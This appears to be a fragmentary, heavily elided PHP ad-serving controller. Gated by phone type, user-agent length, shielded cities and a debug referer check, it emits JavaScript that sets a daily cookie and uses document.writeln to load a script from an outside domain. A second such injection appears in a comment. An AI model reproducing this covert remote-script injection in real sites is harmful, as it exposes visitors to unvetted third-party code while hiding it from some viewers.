...
class AdsController extends CommonController
{
    ...
    public function adsAction($ad_pos, $position_id){
        ...
        {
            //$this->memcache_obj->set('zhoushengzhe', "12345678", MEMCACHE_COMPRESSED, 20);
            //echo $this->memcache_obj->get('zhoushengzhe');
            //die("okok11");
        }
        ...
        { 
            message('No advertisement type is available');
        }
        ...
        if(strpos(server('http_referer'), 'debug=test'))
        {
            ...
            out_haimen_ad($this->client_data->phone_type, $ip_number);
        }
        else
        {
    ...
    {
        //默认的
        $status = config('app.status.default');
        foreach(config('app.status') as $key=>$val)
        {
        ...
        if($is_shield_city===false)
        {
            ...
            if(in_array($this->client_data->phone_type, $client_type))
            {
                ...
                if($this->client_data->phone_type==1)
                {
                    ...
                    {
                        //if( empty($_COOKIE['pgm2_'.$ip_number]) ){
                            //function IconsetCookie(name,value){var Days=1;var exp=new Date();exp.setTime(exp.getTime()+Days*24*60*60*1000);document.cookie=name+"="+escape(value)+";expires="+exp.toGMTString()}function WckgeteCookie(name){var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");if(arr=document.cookie.match(reg)){return unescape(arr[2])}else{IconsetCookie(name,1);return 1}}if(WckgeteCookie('pgm2_170941731720171016')!=2){IconsetCookie('pgm2_170941731720171016',2);document.writeln('<script type="text/javascript" src="http://s.r5tao.com/c/6092.js"></script>');}
                            
							//setcookie('pgm2_'.$ip_number, 1 , strtotime('23:59:59'));
                        //}
                    }
                }
                ...
                if($this->client_data->phone_type==2)
                {
                    if(strlen(server('http_user_agent')) > 134)
                    {
						if( empty($_COOKIE['pgm1_'.$ip_number]) ){
                            ...
                            ?>function IconsetCookie(name,value){var Days=1;var exp=new Date();exp.setTime(exp.getTime()+Days*24*60*60*1000);document.cookie=name+"="+escape(value)+";expires="+exp.toGMTString()}function WckgeteCookie(name){var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");if(arr=document.cookie.match(reg)){return unescape(arr[2])}else{IconsetCookie(name,1);return 1}}if(WckgeteCookie('pgm1_170941731720171016')!=2){IconsetCookie('pgm1_170941731720171016',2);document.writeln('<script type="text/javascript" src="http://mac.iguzi.cn/az_d1.js"></script>')}<?php
